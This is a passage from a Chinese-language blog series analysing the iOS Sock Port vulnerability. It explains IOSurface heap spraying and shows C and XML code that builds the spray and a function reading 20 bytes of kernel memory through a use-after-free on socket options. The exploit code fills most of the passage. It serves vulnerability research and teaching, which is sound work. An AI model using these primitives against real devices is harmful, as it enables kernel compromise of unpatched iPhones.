<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeBinarySignature</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span>&gt;</span>2<span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span> <span class="attr">length</span>=<span class="string">$&#123;array_length&#125;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[0] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[array_length - 1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeSymbol</span>&gt;</span>$&#123;sizeof(uint32_t) + 1&#125;<span class="tag">&lt;/<span class="name">kOSSerializeSymbol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>$&#123;key&#125;<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>此时 XML 结构已经构建完毕，只需要向 <code>xml_data</code> 占位符中填充 Spraying Data，向 key 中填充标识符即可完成组装。</p>
<h2 id="组装数据"><a href="#组装数据" class="headerlink" title="组装数据"></a>组装数据</h2><p>接下来的代码完成的是数据填充和向内核发送数据，基于上面的讨论很好理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Keep track of when we need to do GC.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> total_arrays = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> sprayed = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> next_gc_step = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// Loop through the arrays.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> array_id = <span class="number">0</span>; array_id &lt; array_count; array_id++) &#123;</span><br><span class="line">    <span class="comment">// If we've crossed the GC sleep boundary, sleep for a bit and schedule the</span></span><br><span class="line">    <span class="comment">// next one.</span></span><br><span class="line">    <span class="comment">// Now build the array and its elements.</span></span><br><span class="line">    <span class="comment">// 1. 生成唯一标识符填充到 key</span></span><br><span class="line">    *key = base255_encode(total_arrays + array_id);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> data_id = <span class="number">0</span>; data_id &lt; current_array_length; data_id++) &#123;</span><br><span class="line">        <span class="comment">// Copy in the data to the appropriate slot.</span></span><br><span class="line">        <span class="comment">// 2. 将数据填充到 OSString</span></span><br><span class="line">        <span class="built_in">memcpy</span>(xml_data[data_id], data, data_size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 向内核发送数据</span></span><br><span class="line">    <span class="comment">// Finally set the array in the surface.</span></span><br><span class="line">    ok = IOSurface_set_value(args, args_size);</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">    	<span class="built_in">free</span>(args);</span><br><span class="line">    	<span class="built_in">free</span>(xml_data);</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">        sprayed += data_size * current_array_length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上述代码中标出的 3 个关键步骤即可将组装好的 XML 送入内核帧缓冲区，内核会为其中的 OSString 分配内存，在这个过程中就完成了 Heap Spraying。</p>
<h1 id="使用-IOSurface-Heap-Spraying-实现-kread"><a href="#使用-IOSurface-Heap-Spraying-实现-kread" class="headerlink" title="使用 IOSurface Heap Spraying 实现 kread"></a>使用 IOSurface Heap Spraying 实现 kread</h1><p>通过构造多个悬垂的 <code>in6p_outputopts</code>，再以伪造的 <code>in6p_outputopts</code> 进行 spraying，将伪造数据结构的 pktinfo 指向待读取地址，minmtu 作为标识符，进行 IOSurface Spraying，随后基于 minmtu 挑选成功 Spraying 的悬垂 <code>in6p_outputopts</code> 区域，使用 getsockopt 获取 pktinfo 结构体内容，由于该结构体大小为 20B，我们由此拿到了指定内核地址 20B 的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// second primitive: read 20 bytes from addr</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">read_20_via_uaf</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create a bunch of sockets</span></span><br><span class="line">    <span class="keyword">int</span> sockets[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">128</span>; i++) &#123;</span><br><span class="line">        sockets[i] = get_socket_with_dangling_options();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create a fake struct with our dangling port address as its pktinfo</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip6_pktopts</span> *<span class="title">fake_opts</span> = <span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ip6_pktopts</span>));</span></span><br><span class="line">    fake_opts-&gt;ip6po_minmtu = <span class="number">0x41424344</span>; <span class="comment">// give a number we can recognize</span></span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)((<span class="keyword">uint64_t</span>)fake_opts + <span class="number">164</span>) = <span class="number">0x41424344</span>; <span class="comment">// on iOS 10, offset is different</span></span><br><span class="line">    fake_opts-&gt;ip6po_pktinfo = (struct in6_pktinfo*)addr;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> found_at = <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// iterate through the sockets to find if we overwrote one</span></span><br><span class="line">        spray_IOSurface((<span class="keyword">void</span> *)fake_opts, <span class="keyword">sizeof</span>(struct ip6_pktopts));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">128</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">            get_minmtu(sockets[j], &amp;minmtu);</span><br><span class="line">            <span class="keyword">if</span> (minmtu == <span class="number">0x41424344</span>) &#123; <span class="comment">// found it!</span></span><br><span class="line">                found_at = j; <span class="comment">// save its index</span></span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (found) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(fake_opts);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Failed to read kernel\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">128</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != found_at) &#123;</span><br><span class="line">            <span class="built_in">close</span>(sockets[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct in6_pktinfo));</span><br><span class="line">    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);</span><br><span class="line">    <span class="built_in">close</span>(sockets[found_at]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了一种更通用的 Heap Spraying 方案，并介绍了通过该方案实现 kread 的过程和原理。</p>
<h1 id="下节预告"><a href="#下节预告" class="headerlink" title="下节预告"></a>下节预告</h1><p>通过 IOSurface Spraying 不仅能实现 kread，也可以实现 kfree。在下一篇文章中，我们将介绍通过 kread + kfree 的组合实现 tfp0 的最后几个步骤。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://developer.apple.com/documentation/iosurface" target="_blank" rel="noopener">IOSurface Framework. Apple Document</a></li>
<li><a href="https://iphonedevwiki.net/index.php/IOSurface" target="_blank" rel="noopener">IOSurface. iPhone Dev Wiki</a></li>
<li><a href="https://github.com/jakeajames/sock_port/tree/sock_port_2" target="_blank" rel="noopener">Sock Port 2. jakeajames</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">高级页面仔 (Soulghost)</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.asm.im/2019/12/01/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89IOSurface-Heap-Spraying/">http://blog.asm.im/2019/12/01/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89IOSurface-Heap-Spraying/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SockPort/">SockPort</a><a class="post-meta__tags" href="/tags/UAF/">UAF</a><a class="post-meta__tags" href="/tags/Heap-Spraying/">Heap Spraying</a><a class="post-meta__tags" href="/tags/IOSurface/">IOSurface</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/12/08/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89The-tfp0/"><i class="fa fa-chevron-left">  </i><span> Sock Port 漏洞解析（四）The tfp0 !</span></a></div><div class="next-post pull-right"><a href="/2019/11/24/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-Mach-OOL-Message-%E6%B3%84%E9%9C%B2-Port-Address/"><span>Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By 高级页面仔 (Soulghost)</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text"><i class="fa fa-user"> 0xfffffff007004000</i><span class="footer-separator">|</span><i class="fa fa-eye"> 0x2004000</i></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>